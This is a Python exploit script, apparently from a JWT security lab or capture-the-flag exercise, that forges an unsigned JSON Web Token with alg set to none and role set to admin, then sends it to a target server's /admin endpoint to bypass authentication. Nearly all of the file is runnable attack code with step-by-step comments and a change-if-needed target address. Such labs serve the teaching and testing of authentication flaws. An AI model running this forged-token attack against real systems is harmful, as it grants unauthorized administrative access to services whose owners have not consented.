"""
attack_none.py — Attack 1: "none" Algorithm Bypass
====================================================
MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material
CVE reference: CVE-2015-9235 (node-jsonwebtoken)

HOW IT WORKS:
  The JWT spec defines alg=none as a valid algorithm meaning "no signature".
  A vulnerable server that includes "none" in its accepted algorithm list
  will skip signature verification entirely.

  Attacker steps:
    1. Build a JWT header with alg=none
    2. Build a payload with role=admin
    3. Leave the signature empty (trailing dot only)
    4. Server accepts it — no private key needed, no brute force, no crypto.

IMPACT: Unauthenticated admin access to any protected endpoint.

Run against vulnerable server:  python attack_none.py
Expected result: HTTP 200 + flag{jwt_alg_confusion_2025}
"""

import base64
import json
import requests

TARGET = "http://10.236.147.152:5000"  # vulnerable server IP — change if needed


def b64url_encode(data: dict) -> str:
    """base64url encode without padding — required by the JWT spec."""
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )


def forge_none_token() -> str:
    """
    Build a JWT with alg=none and an empty signature.
    No cryptographic material required whatsoever.
    """
    header = b64url_encode({"alg": "none", "typ": "JWT"})
    payload = b64url_encode({"user": "attacker", "role": "admin"})
    return f"{header}.{payload}."  # trailing dot = empty signature


def attack_none():
    print("\n" + "=" * 60)
    print("  ATTACK 1 — 'none' Algorithm Bypass")
    print("  MITRE T1550.001 | CVE-2015-9235")
    print("=" * 60)

    # Step 1: show what a real token looks like (optional recon)
    resp = requests.post(f"{TARGET}/login", json={"username": "alice", "password": "pass123"})
    real_token = resp.json().get("token", "")
    print(f"\n[+] Real alice token (for reference): {real_token[:50]}...")

    # Step 2: forge admin token — zero crypto needed
    forged = forge_none_token()
    print(f"[+] Forged none-alg token:            {forged[:50]}...")
    print(f"[+] Full forged token:\n    {forged}\n")

    # Step 3: hit /admin with forged token
    r = requests.get(
        f"{TARGET}/admin",
        headers={"Authorization": f"Bearer {forged}"},
    )
    print(f"[RESULT] HTTP {r.status_code}")
    print(f"[RESULT] {r.json()}")

    if r.status_code == 200:
        print("\n[!!!] ATTACK SUCCESSFUL — admin access without private key")
    else:
        print("\n[---] Attack blocked — server is patched")


if __name__ == "__main__":
    attack_none()
